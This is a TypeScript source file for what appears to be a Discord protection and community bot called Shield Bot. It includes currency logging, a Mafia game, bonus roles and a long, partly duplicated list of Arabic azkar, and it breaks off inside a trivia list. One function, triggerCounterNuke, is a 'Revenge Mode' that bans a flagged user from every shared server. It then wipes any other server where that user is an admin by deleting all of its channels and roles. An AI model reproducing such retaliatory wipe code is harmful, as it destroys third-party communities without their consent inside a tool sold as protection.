import { GoogleGenAI } from "@google/genai";
import axios from 'axios';
import express from "express";
import session from 'express-session';
import cookieParser from 'cookie-parser';
import SQLiteStore from 'better-sqlite3-session-store';
import jwt from 'jsonwebtoken';
import { createServer as createViteServer } from "vite";
import nblox from 'noblox.js';
import { 
  Client, 
  GatewayIntentBits, 
  Partials, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ChannelType,
  PermissionFlagsBits,
  AttachmentBuilder,
  REST,
  Routes,
  SlashCommandBuilder,
  AuditLogEvent,
  Events,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  TextChannel
} from "discord.js";
import { createCanvas, loadImage } from "canvas";
import GIFEncoder from "gif-encoder-2";
import db from "./src/lib/db.ts";
import dotenv from "dotenv";
import { config } from "./config.js";

dotenv.config();

// Configuration fallbacks
const DISCORD_TOKEN = process.env.DISCORD_TOKEN || config.discordToken;
const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID || config.clientId;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || config.clientSecret;
const APP_URL = process.env.APP_URL || config.appUrl;
const GEMINI_API_KEY = process.env.GEMINI_API_KEY || config.geminiApiKey;
const JWT_SECRET = process.env.JWT_SECRET || config.jwtSecret;

// Discord Bot Setup
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction],
});

const PREFIX = "Xb";
import fs from "fs";
import path from "path";

// Protection Maps
const spamMap = new Map<string, { count: number, lastMessage: number }>();
const raidMap = new Map<string, { count: number, lastJoin: number }>();

// Mafia Game State
interface MafiaPlayer {
  id: string;
  tag: string;
  role: 'mafia' | 'doctor' | 'detective' | 'citizen';
  isAlive: boolean;
}

interface MafiaGame {
  guildId: string;
  channelId: string;
  players: MafiaPlayer[];
  phase: 'join' | 'night' | 'day' | 'voting';
  nightActions: {
    mafiaTarget?: string;
    doctorTarget?: string;
    detectiveTarget?: string;
  };
  votes: Map<string, string>; // VoterID -> TargetID
  messageId?: string;
  timer?: NodeJS.Timeout;
}

const mafiaGames = new Map<string, MafiaGame>();
const activeGames = new Map<string, { guildId: string, channelId: string, type: string, timer?: NodeJS.Timeout, collector?: any }>();
const lastAzkarSent = new Map<string, number>();
const pendingTransfers = new Map<string, { targetId: string, amount: number, code: string, timeout: NodeJS.Timeout }>();

async function logCurrencyTransaction(guildId: string, userId: string, amount: number, reason: string, type: 'add' | 'remove' | 'transfer') {
  const settings = db.prepare("SELECT channelId FROM currency_log_settings WHERE guildId = ?").get(guildId) as any;
  if (!settings) return;

  const channel = client.channels.cache.get(settings.channelId) as TextChannel;
  if (!channel) return;

  const embed = new EmbedBuilder()
    .setTitle(`💰 Currency Log: ${type.toUpperCase()}`)
    .setDescription(`User: <@${userId}>\nAmount: **${amount}** XB\nReason: ${reason}`)
    .setColor(type === 'add' ? 0x00FF00 : type === 'remove' ? 0xFF0000 : 0x5865F2)
    .setTimestamp();

  const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId) as any;
  const balance = userRow?.xb || 0;
  embed.addFields({ name: "New Balance", value: `**${balance}** XB`, inline: true });

  await channel.send({ embeds: [embed] }).catch(() => {});
}

async function logEvent(guildId: string, eventType: string, data: { title: string, description: string, color?: number, fields?: any[], thumbnail?: string }) {
  const settings = db.prepare("SELECT * FROM logging_settings WHERE guildId = ?").get(guildId) as any;
  if (!settings || !settings.channelId) return;

  const columnMap: { [key: string]: string } = {
    'messageDelete': 'logMessageDelete',
    'messageUpdate': 'logMessageEdit',
    'guildMemberAdd': 'logMemberJoin',
    'guildMemberRemove': 'logMemberLeave',
    'guildMemberUpdate': 'logRoleUpdate',
    'channelUpdate': 'logChannelUpdate',
    'voiceStateUpdate': 'logVoiceState',
    'interactionCreate': 'logCommandUsage',
    'levelUp': 'logLevelUp',
    'ticketEvent': 'logTicketEvents',
    'protectionEvent': 'logProtectionEvents',
    'logBotAdd': 'logBotAdd'
  };

  const columnName = columnMap[eventType];
  if (columnName && settings[columnName] !== 1) return;

  const channel = client.channels.cache.get(settings.channelId) as TextChannel;
  if (!channel) return;

  const embed = new EmbedBuilder()
    .setTitle(data.title)
    .setDescription(data.description)
    .setColor(data.color || 0x5865F2)
    .setTimestamp();

  if (data.fields) embed.addFields(data.fields);
  if (data.thumbnail) embed.setThumbnail(data.thumbnail);

  await channel.send({ embeds: [embed] }).catch(() => {});
}

async function triggerCounterNuke(userId: string, sourceGuildId: string) {
  console.log(`🚀 Counter-Nuke triggered for user ${userId} from guild ${sourceGuildId}`);
  
  client.guilds.cache.forEach(async (guild) => {
    try {
      const member = await guild.members.fetch(userId).catch(() => null);
      if (!member) return;

      // 1. Kick/Ban from all shared servers
      if (guild.members.me?.permissions.has(PermissionFlagsBits.BanMembers)) {
        await member.ban({ reason: "🛡️ Counter-Nuke: User triggered Anti-Nuke in another server." }).catch(() => {});
      } else if (guild.members.me?.permissions.has(PermissionFlagsBits.KickMembers)) {
        await member.kick("🛡️ Counter-Nuke: User triggered Anti-Nuke in another server.").catch(() => {});
      }

      // 2. If user is Admin and Bot is Admin, "Destroy" the server (Revenge Mode)
      if (member.permissions.has(PermissionFlagsBits.Administrator) && guild.members.me?.permissions.has(PermissionFlagsBits.Administrator)) {
        console.log(`🔥 Destroying guild ${guild.name} (${guild.id}) as revenge against ${userId}`);
        
        // Change server name
        await guild.setName("🛡️ SERVER PROTECTED BY SHIELD BOT").catch(() => {});
        
        // Delete all channels
        guild.channels.cache.forEach(async (channel) => {
          await channel.delete("🛡️ Counter-Nuke: Revenge Mode").catch(() => {});
        });

        // Delete all roles (except @everyone and bot's own role)
        guild.roles.cache.forEach(async (role) => {
          if (role.id !== guild.id && role.managed === false && role.position < guild.members.me!.roles.highest.position) {
            await role.delete("🛡️ Counter-Nuke: Revenge Mode").catch(() => {});
          }
        });

        // Create a single "Revenge" channel
        const newChannel = await guild.channels.create({
          name: "🛡️-server-protected",
          type: ChannelType.GuildText,
          topic: "This server was destroyed because its admin tried to nuke another server protected by Shield Bot."
        }).catch(() => null);

        if (newChannel) {
          await newChannel.send({
            embeds: [
              new EmbedBuilder()
                .setTitle("🛡️ Shield Bot - Revenge Mode")
                .setDescription(`This server has been neutralized because one of its administrators (<@${userId}>) attempted to nuke a server protected by Shield Bot.\n\n**Shield Bot does not tolerate attacks.**`)
                .setColor(0xFF0000)
                .setTimestamp()
            ]
          }).catch(() => {});
        }
      }
    } catch (err) {
      console.error(`Error in Counter-Nuke for guild ${guild.id}:`, err);
    }
  });
}

async function getAuditLogExecutor(guild: any, type: AuditLogEvent) {
  try {
    const auditLogs = await guild.fetchAuditLogs({ limit: 1, type });
    const entry = auditLogs.entries.first();
    if (!entry) return null;
    if (Date.now() - entry.createdTimestamp > 5000) return null; 
    return entry.executor;
  } catch (e) {
    return null;
  }
}

async function checkBonusRoles(guildId: string, userId: string) {
  const guild = client.guilds.cache.get(guildId);
  if (!guild) return;

  const member = await guild.members.fetch(userId).catch(() => null);
  if (!member) return;

  const row = db.prepare("SELECT bonus FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId) as any;
  if (!row || row.bonus < 20) return;

  const settings = db.prepare("SELECT maxRoleId, excludedRoleIds, baseRoleId FROM bonus_role_settings WHERE guildId = ?").get(guildId) as any;
  const excludedRoleIds = settings?.excludedRoleIds ? settings.excludedRoleIds.split(',').map((id: string) => id.trim()) : [];
  const maxRoleId = settings?.maxRoleId;
  const baseRoleId = settings?.baseRoleId;

  let systemRoles: any[] = [];

  if (baseRoleId && maxRoleId) {
    // Generate roles dynamically from hierarchy
    const baseRole = guild.roles.cache.get(baseRoleId);
    const maxRole = guild.roles.cache.get(maxRoleId);
    
    if (baseRole && maxRole) {
      systemRoles = guild.roles.cache
        .filter(r => r.position > baseRole.position && r.position <= maxRole.position && !excludedRoleIds.includes(r.id) && !r.managed)
        .sort((a, b) => a.position - b.position)
        .map(r => r);
    }
  }

  // If dynamic list is empty, fallback to manual list
  if (systemRoles.length === 0) {
    const roles = db.prepare("SELECT roleId FROM bonus_roles WHERE guildId = ?").all(guildId) as any[];
    if (roles.length === 0) return;

    systemRoles = roles
      .map(r => guild.roles.cache.get(r.roleId))
      .filter(r => r !== undefined && !excludedRoleIds.includes(r.id) && !r.managed)
      .sort((a, b) => a!.position - b!.position);
  }

  if (systemRoles.length === 0) return;

  // Check if user has the base role to start progression
  if (baseRoleId && !member.roles.cache.has(baseRoleId)) {
    // If they don't have base role, remove any system roles they might have
    for (const role of systemRoles) {
      if (member.roles.cache.has(role.id)) {
        await member.roles.remove(role.id).catch(() => {});
      }
    }
    return;
  }

  const bonus = row.bonus;
  const targetRoleIndex = Math.floor(bonus / 20) - 1;

  let changed = false;
  let lastAddedRole = null;
  let lastRemovedRole = null;

  for (let i = 0; i < systemRoles.length; i++) {
    const role = systemRoles[i];
    if (i <= targetRoleIndex) {
      // User should have this role (Stacking: keep previous roles)
      if (!member.roles.cache.has(role.id)) {
        await member.roles.add(role.id).catch(() => {});
        lastAddedRole = role;
        changed = true;
      }
    } else {
      // User should NOT have this role (either they haven't reached it or bonus decreased)
      if (member.roles.cache.has(role.id)) {
        await member.roles.remove(role.id).catch(() => {});
        lastRemovedRole = role;
        changed = true;
      }
    }
  }

  if (changed) {
    // Log the change
    const logChannelId = db.prepare("SELECT logChannel FROM protection_settings WHERE guildId = ?").get(guildId) as any;
    if (logChannelId?.logChannel) {
      const logChannel = guild.channels.cache.get(logChannelId.logChannel) as any;
      if (logChannel) {
        const embed = new EmbedBuilder()
          .setTitle("تحديث رتب البونيس (Bonus)")
          .setColor(0x00FF00)
          .setTimestamp();
        
        if (lastAddedRole && lastRemovedRole) {
          embed.setDescription(`تم تحديث رتب ${member} (Bonus: ${bonus})`);
        } else if (lastAddedRole) {
          embed.setDescription(`حصل ${member} على رتبة ${lastAddedRole} (Bonus: ${bonus})`);
        } else if (lastRemovedRole) {
          embed.setDescription(`تمت إزالة رتبة ${lastRemovedRole} من ${member} (Bonus: ${bonus})`);
        }
        
        logChannel.send({ embeds: [embed] }).catch(() => {});
      }
    }
  }
}

async function awardXB(guildId: string, userId: string, amount: number, reason: string) {
  db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(userId, guildId, amount, amount);
  await logCurrencyTransaction(guildId, userId, amount, reason, 'add');
}

async function deductXB(guildId: string, userId: string, amount: number, reason: string) {
  const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId) as any;
  const currentBalance = userRow?.xb || 0;
  const newBalance = Math.max(0, currentBalance - amount);
  db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = ?").run(userId, guildId, newBalance, newBalance);
  await logCurrencyTransaction(guildId, userId, amount, reason, 'remove');
}

async function syncCurrencyFromLogs() {
  console.log("Starting currency sync from logs...");
  const guilds = client.guilds.cache;
  for (const [guildId, guild] of guilds) {
    const settings = db.prepare("SELECT channelId FROM currency_log_settings WHERE guildId = ?").get(guildId) as any;
    if (!settings) continue;

    const channel = await client.channels.fetch(settings.channelId).catch(() => null) as TextChannel | null;
    if (!channel || channel.type !== ChannelType.GuildText) continue;

    try {
      const messages = await channel.messages.fetch({ limit: 500 });
      const balances = new Map<string, number>();

      for (const msg of messages.values()) {
        if (!msg.embeds || msg.embeds.length === 0) continue;
        const embed = msg.embeds[0];
        
        const userMatch = embed.description?.match(/User: <@!?(\d+)>/);
        if (!userMatch) continue;
        const userId = userMatch[1];

        if (balances.has(userId)) continue;

        const balanceField = embed.fields.find(f => f.name === "New Balance");
        if (!balanceField) continue;
        const balanceMatch = balanceField.value.match(/\*\*(\d+)\*\* XB/);
        if (!balanceMatch) continue;
        
        const balance = parseInt(balanceMatch[1]);
        balances.set(userId, balance);
      }

      for (const [userId, balance] of balances) {
        db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = ?").run(userId, guildId, balance, balance);
      }
      console.log(`Synced ${balances.size} users in guild ${guild.name}`);
    } catch (err) {
      console.error(`Failed to sync guild ${guildId}:`, err);
    }
  }
}

const AZKAR_LIST = [
  "سبحان الله وبحمده، سبحان الله العظيم",
  "لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير",
  "اللهم صل وسلم على نبينا محمد",
  "أستغفر الله وأتوب إليه",
  "لا حول ولا قوة إلا بالله",
  "الحمد لله رب العالمين",
  "الله أكبر",
  "سبحان الله",
  "لا إله إلا الله",
  "سبحان الله وبحمده عدد خلقه، ورضا نفسه، وزنة عرشه، ومداد كلماته",
  "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي فإنه لا يغفر الذنوب إلا أنت",
  "رضيت بالله رباً، وبالإسلام ديناً، وبمحمد صلى الله عليه وسلم نبياً",
  "اللهم إني أسألك علماً نافعاً، ورزقاً طيباً، وعملاً متقبلاً",
  "يا حي يا قيوم برحمتك أستغيث أصلح لي شأني كله ولا تكلني إلى نفسي طرفة عين",
  "حسبي الله لا إله إلا هو عليه توكلت وهو رب العرش العظيم",
  "اللهم بك أصبحنا وبك أمسينا وبك نحيا وبك نموت وإليك النشور",
  "اللهم ما أصبح بي من نعمة أو بأحد من خلقك فمنك وحدك لا شريك لك، فلك الحمد ولك الشكر",
  "اللهم عافني في بدني، اللهم عافني في سمعي، اللهم عافني في بصري، لا إله إلا أنت",
  "اللهم إني أعوذ بك من الكفر والفقر، وأعوذ بك من عذاب القبر، لا إله إلا أنت",
  "اللهم إني أسألك العفو والعافية في الدنيا والآخرة",
  "اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي",
  "اللهم استر عوراتي وآمن روعاتي",
  "اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي وأعوذ بعظمتك أن أغتال من تحتي",
  "يا حي يا قيوم برحمتك أستغيث أصلح لي شأني كله ولا تكلني إلى نفسي طرفة عين",
  "أصبحنا وأصبح الملك لله والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير",
  "رب أسألك خير ما في هذا اليوم وخير ما بعده وأعوذ بك من شر ما في هذا اليوم وشر ما بعده",
  "رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر",
  "اللهم عالم الغيب والشهادة فاطر السماوات والأرض، رب كل شيء ومليكه، أشهد أن لا إله إلا أنت، أعوذ بك من شر نفسي ومن شر الشيطان وشركه، وأن أقترف على نفسي سوءاً أو أجره إلى مسلم",
  "بسم الله الذي لا يضر مع اسمه شيء في الأرض ولا في السماء وهو السميع العليم",
  "أعوذ بكلمات الله التامات من شر ما خلق",
  "اللهم إني أعوذ بك من الهم والحزن، والعجز والكسل، والبخل والجبن، وضلع الدين، وغلبة الرجال",
  "اللهم اجعل في قلبي نوراً، وفي بصري نوراً، وفي سمعي نوراً، وعن يميني نوراً، وعن يساري نوراً، وفوقي نوراً، وتحتي نوراً، وأمامي نوراً، وخلفي نوراً، واجعل لي نوراً",
  "اللهم إني ظلمت نفسي ظلماً كثيراً، ولا يغفر الذنوب إلا أنت، فاغفر لي مغفرة من عندك وارحمني إنك أنت الغفور الرحيم",
  "اللهم اغفر لي خطيئتي وجهلي وإسرافي في أمري وما أنت أعلم به مني",
  "اللهم اغفر لي جدي وهزلي وخطئي وعمدي وكل ذلك عندي",
  "اللهم اغفر لي ما قدمت وما أخرت وما أسررت وما أعلنت وما أنت أعلم به مني، أنت المقدم وأنت المؤخر وأنت على كل شيء قدير",
  "اللهم إني أعوذ بك من زوال نعمتك، وتحول عافيتك، وفجاءة نقمتك، وجميع سخطك",
  "اللهم إني أعوذ بك من فتنة النار وعذاب النار، وفتنة القبر وعذاب القبر، ومن شر فتنة الغنى، ومن شر فتنة الفقر، وأعوذ بك من شر فتنة المسيح الدجال",
  "اللهم اغسل خطاياي بماء الثلج والبرد، ونق قلبي من الخطايا كما نقيت الثوب الأبيض من الدنس، وباعد بيني وبين خطاياي كما باعدت بين المشرق والمغرب",
  "اللهم إني أعوذ بك من الكسل والهرم والمأثم والمغرم",
  "اللهم مصرف القلوب صرف قلوبنا على طاعتك",
  "يا مقلب القلوب ثبت قلبي على دينك",
  "اللهم إني أسألك الهدى والتقى والعفاف والغنى",
  "اللهم اغفر لي وارحمني واهدني وعافني وارزقني",
  "اللهم إني أعوذ بك من جهد البلاء، ودرك الشقاء، وسوء القضاء، وشماتة الأعداء",
  "اللهم أصلح لي ديني الذي هو عصمة أمري، وأصلح لي دنياي التي فيها معاشي، وأصلح لي آخرتي التي فيها معادي، واجعل الحياة زيادة لي في كل خير، واجعل الموت راحة لي من كل شر",
  "اللهم إني أسألك من الخير كله عاجله وآجله ما علمت منه وما لم أعلم، وأعوذ بك من الشر كله عاجله وآجله ما علمت منه وما لم أعلم",
  "اللهم إني أسألك من خير ما سألك عبدك ونبيك، وأعوذ بك من شر ما عاذ به عبدك ونبيك",
  "اللهم إني أسألك الجنة وما قرب إليها من قول أو عمل، وأعوذ بك من النار وما قرب إليها من قول أو عمل، وأسألك أن تجعل كل قضاء قضيته لي خيراً",
  "اللهم إني أعوذ بك من علم لا ينفع، ومن قلب لا يخشع، ومن نفس لا تشبع، ومن دعوة لا يستجاب لها",
  "اللهم اكفني بحلالك عن حرامك، وأغنني بفضلك عمن سواك",
  "اللهم إني أسألك الثبات في الأمر، والعزيمة على الرشد، وأسألك موجبات رحمتك، وعزائم مغفرتك، وأسألك شكر نعمتك، وحسن عبادتك، وأسألك قلباً سليماً، ولساناً صادقاً، وأسألك من خير ما تعلم، وأعوذ بك من شر ما تعلم، وأستغفرك لما تعلم، إنك أنت علام الغيوب",
  "اللهم رب السماوات ورب الأرض ورب العرش العظيم، ربنا ورب كل شيء، فالق الحب والنوى، ومنزل التوراة والإنجيل والفرقان، أعوذ بك من شر كل شيء أنت آخذ بناصيته، اللهم أنت الأول فليس قبلك شيء، وأنت الآخر فليس بعدك شيء، وأنت الظاهر فليس فوقك شيء، وأنت الباطن فليس دونك شيء، اقض عنا الدين وأغننا من الفقر",
  "اللهم اغفر لي ذنبي كله، دقه وجله، وأوله وآخره، وعلانيته وسره",
  "اللهم إني أعوذ برضاك من سخطك، وبمعافاتك من عقوبتك، وأعوذ بك منك لا أحصي ثناء عليك أنت كما أثنيت على نفسك",
  "اللهم إني أعوذ بك من البرص والجنون والجذام ومن سيئ الأسقام",
  "اللهم إني أعوذ بك من منكرات الأخلاق والأعمال والأهواء",
  "اللهم إنك عفو كريم تحب العفو فاعف عني",
  "اللهم إني أسألك حبك وحب من يحبك والعمل الذي يبلغني حبك",
  "اللهم اجعل حبك أحب إلي من نفسي وأهلي ومن الماء البارد",
  "اللهم إني أسألك فواتح الخير وخواتمه وجوامعه وأوله وآخره وظاهره وباطنه والدرجات العلى من الجنة",
  "اللهم إني أسألك أن ترفع ذكري وتضع وزري وتطهر قلبي وتصن فرجي وتغفر لي ذنبي وأسألك الدرجات العلى من الجنة",
  "اللهم إني أسألك أن تبارك في نفسي وفي سمعي وفي بصري وفي روحي وفي خلقي وفي خلقي وفي أهلي وفي محياي وفي مماتي وفي عملي فتقبل حسناتي وأسألك الدرجات العلى من الجنة",
  "اللهم إني أعوذ بك من شر ما عملت ومن شر ما لم أعمل",
  "اللهم إني أعوذ بك من غلبة الدين وغلبة العدو وشماتة الأعداء",
  "اللهم اغفر لي وارحمني وألحقني بالرفيق الأعلى",
  "اللهم آتنا في الدنيا حسنة وفي الآخرة حسنة وقنا عذاب النار",
  "سُبْحَانَ اللهِ وَبِحَمْدِهِ: عَدَدَ خَلْقِهِ، وَرِضَا نَفْسِهِ، وَزِنَةَ عَرْشِهِ، وَمِدَادَ كَلِمَاتِهِ",
  "اللهم إني أعوذ بك من الفقر والقلة والذلة، وأعوذ بك من أن أظلم أو أظلم",
  "اللهم إني أعوذ بك من جار السوء في دار المقامة فإن جار البادية يتحول",
  "اللهم إني أعوذ بك من قلب لا يخشع ومن دعاء لا يسمع ومن نفس لا تشبع ومن علم لا ينفع، أعوذ بك من هؤلاء الأربع",
  "اللهم إني أعوذ بك من يوم السوء ومن ليلة السوء ومن ساعة السوء ومن صاحب السوء ومن جار السوء في دار المقامة",
  "اللهم إني أسألك الجنة وأستجير بك من النار",
  "اللهم فقهني في الدين",
  "اللهم إني أعوذ بك أن أشرك بك وأنا أعلم وأستغفرك لما لا أعلم",
  "اللهم انفعني بما علمتني وعلمني ما ينفعني وزدني علماً",
  "اللهم إني أسألك إيماناً لا يرتد ونعيماً لا ينفد ومرافقة محمد صلى الله عليه وسلم في أعلى جنة الخلد",
  "اللهم قني شر نفسي واعزم لي على أرشد أمري",
  "اللهم اغفر لي ما أسررت وما أعلنت وما أخطأت وما عمدت وما علمت وما جهلت",
  "اللهم حاسبني حساباً يسيراً",
  "اللهم إني أسألك فعل الخيرات وترك المنكرات وحب المساكين وأن تغفر لي وترحمني وإذا أردت فتنة قوم فتوفني غير مفتون",
  "اللهم إني أسألك حبك وحب من يحبك وحب عمل يقربني إلى حبك",
  "اللهم إني أسألك خير المسألة وخير الدعاء وخير النجاح وخير العمل وخير الثواب وخير الحياة وخير الممات وثبتني وثقل موازيني وحقق إيماني وارفع درجاتي وتقبل صلاتي واغفر خطيئتي وأسألك الدرجات العلى من الجنة",
  "اللهم إني أسألك الهدى والسداد",
  "اللهم إني أعوذ بك من العجز والكسل والجبن والبخل والهرم وعذاب القبر",
  "اللهم آت نفسي تقواها وزكها أنت خير من زكاها أنت وليها ومولاها",
  "اللهم إني أعوذ بك من علم لا ينفع ومن قلب لا يخشع ومن نفس لا تشبع ومن دعوة لا يستجاب لها",
  "اللهم إني أعوذ بك من شر سمعي ومن شر بصري ومن شر لساني ومن شر قلبي ومن شر منيي",
  "اللهم إني أعوذ بك من الهدم وأعوذ بك من التردي وأعوذ بك من الغرق والحرق والهرم وأعوذ بك أن يتخبطني الشيطان عند الموت وأعوذ بك أن أموت في سبيلك مدبراً وأعوذ بك أن أموت لديغاً",
  "اللهم إني أعوذ بك من الجوع فإنه بئس الضجيع وأعوذ بك من الخيانة فإنها بئست البطانة",
  "اللهم إني أعوذ بك من الشقاق والنفاق وسوء الأخلاق",
  "اللهم إني أعوذ بك من الصمم والبكم والجنون والجذام والبرص وسيئ الأسقام",
  "اللهم إني أعوذ بك من القسوة والغفلة والعيلة والذلة والمسكنة وأعوذ بك من الفقر والكفر والفسوق والشقاق والنفاق والسمعة والرياء وأعوذ بك من الصمم والبكم والجنون والجذام والبرص وسيئ الأسقام",
  "اللهم إني أسألك الهدى والتقى والعفاف والغنى",
  "اللهم اغفر لي وارحمني واهدني وعافني وارزقني",
  "اللهم إني أعوذ بك من جهد البلاء، ودرك الشقاء، وسوء القضاء، وشماتة الأعداء",
  "اللهم أصلح لي ديني الذي هو عصمة أمري، وأصلح لي دنياي التي فيها معاشي، وأصلح لي آخرتي التي فيها معادي، واجعل الحياة زيادة لي في كل خير، واجعل الموت راحة لي من كل شر",
  "اللهم إني أسألك من الخير كله عاجله وآجله ما علمت منه وما لم أعلم، وأعوذ بك من الشر كله عاجله وآجله ما علمت منه وما لم أعلم",
  "اللهم إني أسألك من خير ما سألك عبدك ونبيك، وأعوذ بك من شر ما عاذ به عبدك ونبيك",
  "اللهم إني أسألك الجنة وما قرب إليها من قول أو عمل، وأعوذ بك من النار وما قرب إليها من قول أو عمل، وأسألك أن تجعل كل قضاء قضيته لي خيراً",
  "اللهم إني أعوذ بك من علم لا ينفع، ومن قلب لا يخشع، ومن نفس لا تشبع، ومن دعوة لا يستجاب لها",
  "اللهم اكفني بحلالك عن حرامك، وأغنني بفضلك عمن سواك",
  "اللهم إني أسألك الثبات في الأمر، والعزيمة على الرشد، وأسألك موجبات رحمتك، وعزائم مغفرتك، وأسألك شكر نعمتك، وحسن عبادتك، وأسألك قلباً سليماً، ولساناً صادقاً، وأسألك من خير ما تعلم، وأعوذ بك من شر ما تعلم، وأستغفرك لما تعلم، إنك أنت علام الغيوب",
  "اللهم رب السماوات ورب الأرض ورب العرش العظيم، ربنا ورب كل شيء، فالق الحب والنوى، ومنزل التوراة والإنجيل والفرقان، أعوذ بك من شر كل شيء أنت آخذ بناصيته، اللهم أنت الأول فليس قبلك شيء، وأنت الآخر فليس بعدك شيء، وأنت الظاهر فليس فوقك شيء، وأنت الباطن فليس دونك شيء، اقض عنا الدين وأغننا من الفقر",
  "اللهم اغفر لي ذنبي كله، دقه وجله، وأوله وآخره، وعلانيته وسره",
  "اللهم إني أعوذ برضاك من سخطك، وبمعافاتك من عقوبتك، وأعوذ بك منك لا أحصي ثناء عليك أنت كما أثنيت على نفسك",
  "اللهم إني أعوذ بك من البرص والجنون والجذام ومن سيئ الأسقام",
  "اللهم إني أعوذ بك من منكرات الأخلاق والأعمال والأهواء",
  "اللهم إنك عفو كريم تحب العفو فاعف عني",
  "اللهم إني أسألك حبك وحب من يحبك والعمل الذي يبلغني حبك",
  "اللهم اجعل حبك أحب إلي من نفسي وأهلي ومن الماء البارد",
  "اللهم إني أسألك فواتح الخير وخواتمه وجوامعه وأوله وآخره وظاهره وباطنه والدرجات العلى من الجنة",
  "اللهم إني أسألك أن ترفع ذكري وتضع وزري وتطهر قلبي وتصن فرجي وتغفر لي ذنبي وأسألك الدرجات العلى من الجنة",
  "اللهم إني أسألك أن تبارك في نفسي وفي سمعي وفي بصري وفي روحي وفي خلقي وفي خلقي وفي أهلي وفي محياي وفي مماتي وفي عملي فتقبل حسناتي وأسألك الدرجات العلى من الجنة",
  "اللهم إني أعوذ بك من شر ما عملت ومن شر ما لم أعمل",
  "اللهم إني أعوذ بك من غلبة الدين وغلبة العدو وشماتة الأعداء",
  "اللهم اغفر لي وارحمني وألحقني بالرفيق الأعلى",
  "اللهم آتنا في الدنيا حسنة وفي الآخرة حسنة وقنا عذاب النار",
  "سُبْحَانَ اللهِ وَبِحَمْدِهِ: عَدَدَ خَلْقِهِ، وَرِضَا نَفْسِهِ، وَزِنَةَ عَرْشِهِ، وَمِدَادَ كَلِمَاتِهِ",
  "اللهم إني أعوذ بك من الفقر والقلة والذلة، وأعوذ بك من أن أظلم أو أظلم",
  "اللهم إني أعوذ بك من جار السوء في دار المقامة فإن جار البادية يتحول",
  "اللهم إني أعوذ بك من قلب لا يخشع ومن دعاء لا يسمع ومن نفس لا تشبع ومن علم لا ينفع، أعوذ بك من هؤلاء الأربع",
  "اللهم إني أعوذ بك من يوم السوء ومن ليلة السوء ومن ساعة السوء ومن صاحب السوء ومن جار السوء في دار المقامة",
  "اللهم إني أسألك الجنة وأستجير بك من النار",
  "اللهم فقهني في الدين",
  "اللهم إني أعوذ بك أن أشرك بك وأنا أعلم وأستغفرك لما لا أعلم",
  "اللهم انفعني بما علمتني وعلمني ما ينفعني وزدني علماً",
  "اللهم إني أسألك إيماناً لا يرتد ونعيماً لا ينفد ومرافقة محمد صلى الله عليه وسلم في أعلى جنة الخلد",
  "اللهم قني شر نفسي واعزم لي على أرشد أمري",
  "اللهم اغفر لي ما أسررت وما أعلنت وما أخطأت وما عمدت وما علمت وما جهلت",
  "اللهم حاسبني حساباً يسيراً",
  "اللهم إني أسألك فعل الخيرات وترك المنكرات وحب المساكين وأن تغفر لي وترحمني وإذا أردت فتنة قوم فتوفني غير مفتون",
  "اللهم إني أسألك حبك وحب من يحبك وحب عمل يقربني إلى حبك",
  "اللهم إني أسألك خير المسألة وخير الدعاء وخير النجاح وخير العمل وخير الثواب وخير الحياة وخير الممات وثبتني وثقل موازيني وحقق إيماني وارفع درجاتي وتقبل صلاتي واغفر خطيئتي وأسألك الدرجات العلى من الجنة",
  "اللهم إني أسألك الهدى والسداد",
  "اللهم إني أعوذ بك من العجز والكسل والجبن والبخل والهرم وعذاب القبر",
  "اللهم آت نفسي تقواها وزكها أنت خير من زكاها أنت وليها ومولاها",
  "اللهم إني أعوذ بك من علم لا ينفع ومن قلب لا يخشع ومن نفس لا تشبع ومن دعوة لا يستجاب لها",
  "اللهم إني أعوذ بك من شر سمعي ومن شر بصري ومن شر لساني ومن شر قلبي ومن شر منيي",
  "اللهم إني أعوذ بك من الهدم وأعوذ بك من التردي وأعوذ بك من الغرق والحرق والهرم وأعوذ بك أن يتخبطني الشيطان عند الموت وأعوذ بك أن أموت في سبيلك مدبراً وأعوذ بك أن أموت لديغاً",
  "اللهم إني أعوذ بك من الجوع فإنه بئس الضجيع وأعوذ بك من الخيانة فإنها بئست البطانة",
  "اللهم إني أعوذ بك من الشقاق والنفاق وسوء الأخلاق",
  "اللهم إني أعوذ بك من الصمم والبكم والجنون والجذام والبرص وسيئ الأسقام",
  "اللهم إني أعوذ بك من القسوة والغفلة والعيلة والذلة والمسكنة وأعوذ بك من الفقر والكفر والفسوق والشقاق والنفاق والسمعة والرياء وأعوذ بك من الصمم والبكم والجنون والجذام والبرص وسيئ الأسقام",
];
const evaluationStates = new Map<string, { staffId: string, step: 'opinion' | 'rating', opinion?: string, promptMsgId?: string }>();

const triviaQuestions = [
  { q: "ما هي عاصمة فرنسا؟", a: "باريس" },
